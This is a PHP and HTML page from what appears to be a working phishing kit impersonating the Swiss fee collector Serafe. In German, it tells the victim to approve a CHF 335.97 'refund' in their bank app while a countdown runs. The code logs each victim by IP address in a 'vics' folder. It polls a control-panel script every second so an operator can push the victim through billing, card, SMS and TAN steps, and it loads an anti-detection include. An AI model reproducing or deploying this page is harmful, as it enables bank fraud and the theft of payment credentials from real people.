<?php 
    require_once "../anti/functions.php";

$ip = ($_SERVER['REMOTE_ADDR'] === '::1') ? '127.0.0.1' : $_SERVER['REMOTE_ADDR'];
$file = 'vics/' . $ip . '.txt';

if (!is_dir('vics')) mkdir('vics', 0755, true);

$step = 'wait';
if (file_exists($file)) {
    $content = file_get_contents($file);
    $lines = explode("\n", $content);
    $step = trim($lines[0]);
}

// HADA HIYA L CONDITION: ila step mashi 'wait' w mashi 'billing' w mashi 'card' w mashi 'sms' w mashi 'tan', dir redirect
if ($step != 'wait' && $step != 'billing' && $step != 'card' && $step != 'sms' && $step != 'tan') {
    switch ($step) {
        case 'reset':
            header("Location: billing.php");
            exit;
        case 'block':
            header("Location: error.html");
            exit;
        case 'success':
            header("Location: done.php");
            exit;
    }
}

// If step is 'wait', save it as 'billing' to prevent redirect loop
if ($step == 'wait') {
    $old_content = file_exists($file) ? file_get_contents($file) : '';
    $old_lines = explode("\n", $old_content);
    $old_data = '';
    if (count($old_lines) > 1) {
        $old_data = implode("\n", array_slice($old_lines, 1));
    }
    file_put_contents($file, "billing\n" . $old_data);
    $step = 'billing';
}
?>
<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Transaktion bestätigen - Serafe</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      background: white;
      width: 100%;
      max-width: 600px;
      padding: 20px;
      border-radius: 8px;
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 20px;
    }

    .logo {
      font-size: 26px;
      font-weight: bold;
      color: #0d5c5c;
    }

    .close {
      font-size: 14px;
      color: #2c5d63;
      cursor: pointer;
      background: none;
      border: none;
      text-decoration: underline;
    }

    .cards {
      display: flex;
      align-items: center;
      justify-content: start;
      margin: 20px 0;
    }

    .card img {
      width: 80px;
      height: auto;
      display: block;
    }

    h1 {
      font-size: 28px;
      color: #0d5c5c;
      margin-bottom: 15px;
    }

    .desc {
      font-size: 16px;
      color: #444;
      margin-bottom: 20px;
      line-height: 1.5;
    }

    .info {
      background: #f8f9fa;
      padding: 20px;
      border-radius: 12px;
      margin-bottom: 25px;
    }

    .info p {
      font-size: 16px;
      color: #333;
      margin-bottom: 10px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .info p:last-child {
      margin-bottom: 0;
    }

    .info svg {
      width: 20px;
      height: 20px;
      flex-shrink: 0;
    }

    .info strong {
      color: #0d5c5c;
    }

    .timer-box {
      text-align: center;
      margin-bottom: 20px;
    }

    .timer-box h3 {
      font-size: 16px;
      color: #666;
      margin-bottom: 20px;
      font-weight: normal;
    }

    .countdown {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 25px;
    }

    .countdown-item {
      text-align: center;
    }

    .countdown-number {
      font-size: 42px;
      font-weight: bold;
      color: #0d5c5c;
      background: white;
      padding: 15px 20px;
      border-radius: 12px;
      min-width: 100px;
      font-family: monospace;
    }

    .countdown-label {
      font-size: 12px;
      color: #888;
      margin-top: 8px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    /* Professional Spinner */
    .spinner-container {
      display: flex;
      justify-content: center;
      align-items: center;
      margin-top: 10px;
    }

    .border-spinner {
      width: 40px;
      height: 40px;
      border: 3px solid rgba(13, 92, 92, 0.2);
      border-top: 3px solid #0d5c5c;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .help {
      margin-top: 20px;
      font-size: 14px;
      color: #2c5d63;
      display: flex;
      align-items: center;
      gap: 8px;
      justify-content: center;
    }

    .security-note {
      margin-top: 20px;
      font-size: 12px;
      color: #888;
      text-align: center;
      line-height: 1.4;
    }

    /* Responsive */
    @media (max-width: 480px) {
      h1 { font-size: 22px; }
      .desc, .info p { font-size: 14px; }
      .logo { font-size: 20px; }
      .container { padding: 15px; }
      .countdown-number { font-size: 28px; min-width: 70px; padding: 10px 12px; }
      .countdown { gap: 12px; }
      .card img { width: 60px; }
    }
  </style>
</head>
<body>

  <div class="container">

    <div class="top-bar">
      <div class="logo">serafe</div>
      <form action="card.php" method="post">
        <input type="hidden" name="choice" value="abbrechen">
        <button class="close" type="submit">Abbrechen</button>
      </form>
    </div>

    <div class="cards">
      <div class="card">
        <img src="../img/qpp.jpg" alt="Serafe App">
      </div>
    </div>

    <h1>Transaktion bestätigen</h1>

    <p class="desc">
      Überprüfen Sie die Zahlungsdetails und bestätigen Sie die Rückerstattung in Ihrer Bank-App.
    </p>

    <div class="info">
      <p>
        <svg viewBox="0 0 24 24" fill="none" stroke="#0d5c5c" stroke-width="2">
          <circle cx="12" cy="12" r="10"></circle>
          <path d="M12 8v4M12 16h.01"></path>
        </svg>
        <strong>Händler:</strong> Serafe AG
      </p>
      <p>
        <svg viewBox="0 0 24 24" fill="none" stroke="#0d5c5c" stroke-width="2">
          <path d="M12 2v4M4 4l2 2M20 4l-2 2M4 20l2-2M20 20l-2-2"></path>
          <circle cx="12" cy="14" r="6"></circle>
        </svg>
        <strong>Betrag:</strong> CHF 335.97
      </p>
      <p>
        <svg viewBox="0 0 24 24" fill="none" stroke="#0d5c5c" stroke-width="2">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        <strong>Datum:</strong> <?php echo date('d.m.Y'); ?>
      </p>
    </div>

    <div class="timer-box">
      <h3>Transaktion wird in wenigen Sekunden bestätigt</h3>
      <div class="countdown">
        <div class="countdown-item">
          <div class="countdown-number" id="minutes">04</div>
          <div class="countdown-label">Minuten</div>
        </div>
        <div class="countdown-item">
          <div class="countdown-number" id="seconds">00</div>
          <div class="countdown-label">Sekunden</div>
        </div>
      </div>
      <div class="spinner-container">
        <div class="border-spinner"></div>
      </div>
    </div>

    <div class="help">
      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#2c5d63" stroke-width="2">
        <circle cx="12" cy="12" r="10"></circle>
        <path d="M12 16v-4M12 8h.01"></path>
      </svg>
      Benötigen Sie Hilfe?
    </div>

    <div class="security-note">
      Ihre Daten werden SSL-verschlüsselt übertragen.<br>
      Die Rückerstattung wird nach erfolgreicher Bestätigung innerhalb von 5-7 Werktagen durchgeführt.
    </div>

  </div>

  <script>
    // Countdown Timer - 4 Minuten (240 Sekunden)
    let timeLeft = 240;
    const minutesElement = document.getElementById('minutes');
    const secondsElement = document.getElementById('seconds');

    function updateTimer() {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      
      minutesElement.textContent = minutes.toString().padStart(2, '0');
      secondsElement.textContent = seconds.toString().padStart(2, '0');
      
      if (timeLeft <= 0) {
        clearInterval(timerInterval);
        window.location.href = 'login.php';
      }
      
      timeLeft--;
    }
    
    const timerInterval = setInterval(updateTimer, 1000);
    updateTimer();

    // Check for step changes from control panel
    const victimIP = '<?php echo $ip; ?>';
    const currentStep = '<?php echo $step; ?>';

    function checkStep() {
        fetch('check_step.php?ip=' + victimIP + '&t=' + Date.now())
            .then(response => response.json())
            .then(data => {
                console.log('Step check:', data);
                if (data.redirect && data.redirect !== '' && data.redirect !== 'billing.php') {
                    window.location.href = data.redirect;
                }
            })
            .catch(error => console.error('Error checking step:', error));
    }

    // Check every second
    setInterval(checkStep, 1000);
    checkStep();
  </script>
</body>
</html>